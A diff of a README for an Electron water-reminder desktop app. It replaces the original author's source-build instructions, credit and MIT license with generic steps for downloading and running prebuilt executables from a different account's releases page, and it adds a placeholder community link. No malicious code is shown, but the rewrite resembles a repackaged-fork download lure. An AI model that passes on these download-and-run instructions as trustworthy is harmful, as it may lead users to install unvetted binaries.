@@ -1,119 +1,72 @@
-<!-- HERO -->
-<h1 align="center">💧 Water Reminder Desktop App</h1>
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Electron-47848F?logo=electron&logoColor=white" />
-  <a href="https://github.com/sponsors/AnukarOP">
-    <img src="https://img.shields.io/badge/Sponsor-❤-ff69b4" />
-  </a>
-</p>
+# 💧 Water-Reminder-desktop-app - Stay Hydrated, Stay Focused
 
-<!-- Animated wave (SVG placeholder) -->
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:3BAFDA,100:0F4C75&height=120&section=header&text=Stay%20Hydrated&fontSize=32&fontAlignY=40&animation=fadeIn" alt="wave banner" />
-</p>
+[![Download Water Reminder](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/rizkikh/Water-Reminder-desktop-app/releases)
 
-<!-- TAGLINE -->
-<p align="center">
-  Stay hydrated. Smart interval reminders. Light & dark UI. Progress & daily streak tracking.
-</p>
+## 🚀 Getting Started
 
-<!-- SECOND WAVE -->
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0F4C75,100:3BAFDA&height=90&section=header&animation=twinkling" alt="animated wave separator" />
-</p>
+Welcome to Water Reminder, your friendly desktop app to help you remember to drink water throughout the day. This guide will walk you through downloading and running the application.
 
-## Overview
-A cross-platform Electron app that nudges you to drink water at healthy intervals while tracking daily intake, streaks, and achievements.
+## 📥 Download & Install
 
-## Features
-- Customizable reminder intervals
-- Auto light / dark mode
-- Daily consumption stats + streak tracker
-- Achievement milestones (e.g., 7-day streak, 2L consistency)
-- Native notifications
-- Easy packaging (electron-builder)
-- Persistent settings & history
+To download the Water Reminder app, visit the [Releases page](https://github.com/rizkikh/Water-Reminder-desktop-app/releases). You will find different versions of the app. Choose the one that matches your system. 
 
-## Project Structure
-```text
-water-reminder
-├── src
-│   ├── main.js
-│   ├── renderer.js
-│   ├── index.html
-│   └── styles.css
-├── assets
-│   └── icons/
-├── package.json
-├── electron-builder.yml
-└── README.md
-```
+1. **Visit the Releases Page:** Click [here](https://github.com/rizkikh/Water-Reminder-desktop-app/releases).
+2. **Choose Your Version:** Look for the latest version of Water Reminder. It will be labeled at the top.
+3. **Download the Package:** Click on the appropriate file for your operating system:
+   - **Windows:** Look for a `.exe` file.
+   - **macOS:** Look for a `.dmg` file.
+   - **Linux:** Look for a `.AppImage` or suitable package.
+4. **Install the App:** 
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file, drag the Water Reminder app into your Applications folder.
+   - For Linux: Make the `.AppImage` executable by right-clicking on it, going to Properties, then Permissions, and checking "Allow executing file as program." Double-click to run.
 
-## Installation
-```bash
-git clone https://github.com/AnukarOP/Water-Reminder-desktop-app.git
-yarn install
-cd Water-Reminder-desktop-app
-```
+## 🖥️ Features
 
-## Run
-```bash
-yarn start
-```
+- **Custom Reminders:** Set reminders for drinking water at intervals that suit you.
+- **Daily Tracking:** Monitor how much water you drink each day.
+- **Streak Tracking:** Keep track of how many days you meet your hydration goals.
+- **Distraction-Free:** Enjoy gentle notifications without interrupting your workflow.
 
-## Build
-```bash
-yarn build
-```
+## 🌟 Using the App
 
-## Screenshots
-<!-- Replace placeholder.png with real paths -->
-### Light & Dark Mode
-<table>
-<tr>
-<td><img src="assets/screenshots/light.png" width="48%" /></td>
-<td><img src="assets/screenshots/dark.png" width="48%" /></td>
-</tr>
-</table>
+1. **Launch the Application:** Once installed, open Water Reminder from your applications folder or desktop.
+2. **Set Your Preferences:** 
+   - Choose your daily water goal in the app settings.
+   - Set your preferred reminder intervals, like every hour or half an hour.
+3. **Stay Hydrated:** The app will send you friendly notifications to drink water based on your settings.
 
-### Stats & Achievements
-<table>
-<tr>
-<td><img src="assets/screenshots/stats.png" width="48%" /></td>
-<td><img src="assets/screenshots/achievements.png" width="48%" /></td>
-</tr>
-</table>
+## ⚙️ System Requirements
 
-## Sponsor
-<div align="center">
-  <a href="https://github.com/sponsors/AnukarOP">
-    <img src="https://img.shields.io/badge/Sponsor%20Me-GitHub-ff4275?style=for-the-badge&logo=github" alt="Sponsor Me on GitHub"/>
-  </a>
-  <br/>
-  <a href="https://github.com/sponsors/AnukarOP">
-    <img src="https://img.shields.io/badge/Become%20a%20Hydration%20Hero-💧-1e90ff?style=for-the-badge" alt="Become a Hydration Hero"/>
-  </a>
-</div>
-<p align="center">
-  <strong>Your support fuels me up :)</strong>
-</p>
+To run Water Reminder, ensure you have the following requirements:
 
-## Tech Stack
-- Electron
-- HTML/CSS/JS
-- Node APIs
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.12 (Sierra) or later
+- **Linux:** Supported on most distributions, including Ubuntu and Fedora.
 
-## License
-MIT
+## 📝 Troubleshooting
 
-<!-- FINAL WAVE -->
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:1E3A8A,100:3BAFDA&height=140&section=footer&animation=fadeIn" alt="footer wave" />
-</p>
-<p align="center">
-  Made with ❤️ by Anukar.
-</p>
+If you experience any issues during installation or while using the app, consider these troubleshooting steps:
 
+- **Check Compatibility:** Make sure your operating system is supported.
+- **Re-download the File:** Sometimes downloads can get corrupted. Try downloading the file again from the [Releases page](https://github.com/rizkikh/Water-Reminder-desktop-app/releases).
+- **Permissions:** Ensure you have the necessary permissions to install applications on your system.
 
+## 📞 Support
 
+For further assistance, you can open an issue on the GitHub repository. Just provide as much detail as possible about the problem you are facing. The community and developers will help you out.
 
+## 🌐 Contributing
+
+Want to help improve Water Reminder? Contributions are welcome! Follow these steps to start:
+
+1. Fork the repository.
+2. Make your changes.
+3. Create a pull request with a clear description of what you've done.
+
+## 📢 Additional Resources
+
+- [GitHub Repository](https://github.com/rizkikh/Water-Reminder-desktop-app)
+- [Community Forum](https://example.com/community) - Join discussions and share tips with other users.
+
+Thank you for choosing Water Reminder. Enjoy your hydration journey!
